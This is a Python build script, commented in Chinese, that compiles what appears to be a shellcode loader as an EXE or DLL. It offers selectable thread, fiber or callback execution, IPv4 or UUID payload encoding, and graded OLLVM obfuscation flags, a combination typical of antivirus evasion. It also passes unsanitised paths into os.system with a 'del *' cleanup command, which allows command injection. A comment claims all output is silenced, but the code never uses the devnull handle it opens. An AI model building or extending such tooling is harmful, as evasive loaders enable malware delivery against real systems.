import os
import subprocess

exec = 0
encode = 0
ftype = 0


def compile(cPath,executeMethod,encodeMethod,filetype):
    obf_modes = {
    "none": "",

    "light": (
        "-mllvm -enable-subobf "
        "-mllvm -enable-splitobf "
        "-mllvm -split_num=2 "
        "-mllvm -enable-cffobf"
    ),

    "medium": (
        "-mllvm -enable-subobf "
        "-mllvm -sub_loop=2 "
        "-mllvm -enable-splitobf "
        "-mllvm -split_num=3 "
        "-mllvm -enable-cffobf "
        "-mllvm -enable-strcry "
        "-mllvm -enable-funcwra"
    ),

    "full": (
        "-mllvm -enable-subobf "
        "-mllvm -sub_loop=3 "
        "-mllvm -enable-splitobf "
        "-mllvm -split_num=3 "
        "-mllvm -enable-cffobf "
        "-mllvm -enable-bcfobf "
        "-mllvm -bcf_loop=2 "
        "-mllvm -bcf_prob=20 "
        "-mllvm -enable-strcry "
        "-mllvm -enable-indibran "
        "-mllvm -enable-funcwra"
    )
}
    if executeMethod == "thread":
        exec = 1
    elif executeMethod == "fiber":
        exec = 2
    elif executeMethod == "callback":
        exec = 3
    else:
        print("[*] executeMethod 编号转换出现错误 !")
        return -1
    if encodeMethod == "ipv4":
        encode = 1
    elif encodeMethod == "uuid":
        encode = 2
    else:
        print("[*] encodeMethod 编号转换出现错误 !")
        return -1


    buildPath = cPath + "build"
    if os.path.exists(buildPath):
        print("[*] build 目录存在，需要删除 build 下所有文件!")
        os.system("cd " + buildPath + "&& del *")
    else:
        os.system("cd " + cPath + "&& mkdir build")
        print("[*] build 目录不存在，已经创建新的 build 目录!")
    print("[*] 开始编译!")
    if filetype == "exe":
        cmake_command = (
                f'cmake -G Ninja '
                f'-DCMAKE_C_COMPILER="clang.exe" '
                f'-DCMAKE_CXX_COMPILER="clang++.exe" '
                f'-DEXECUTE_METHOD={exec} '
                f'-DENCODE_METHOD={encode} '
                f'-DOBFUSCATION_FLAGS="{obf_modes["none"]}" '
                f'..'
            )
    elif filetype == "dll":
        cmake_command = (
                f'cmake -G Ninja '
                f'-DCMAKE_C_COMPILER="clang.exe" '
                f'-DCMAKE_CXX_COMPILER="clang++.exe" '
                f'-DBUILD_SHARED_LIBS=ON '
                f'-DEXECUTE_METHOD={exec} '
                f'-DENCODE_METHOD={encode} '
                f'-DOBFUSCATION_FLAGS="{obf_modes["medium"]}" '
                f'..'
            )
    # 进入 build 目录
    os.chdir(buildPath)
    # 执行 cmake
    subprocess.run(cmake_command, shell=True, check=True)
    # 执行 ninja 并彻底静默所有输出（stdout 和 stderr）
    with open(os.devnull, "w") as devnull:
        subprocess.run("ninja", shell=True, check=True, stderr=subprocess.STDOUT)


# cmake -G Ninja -DCMAKE_C_COMPILER=clang.exe -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_ASM_MASM_COMPILER=ml.exe ..
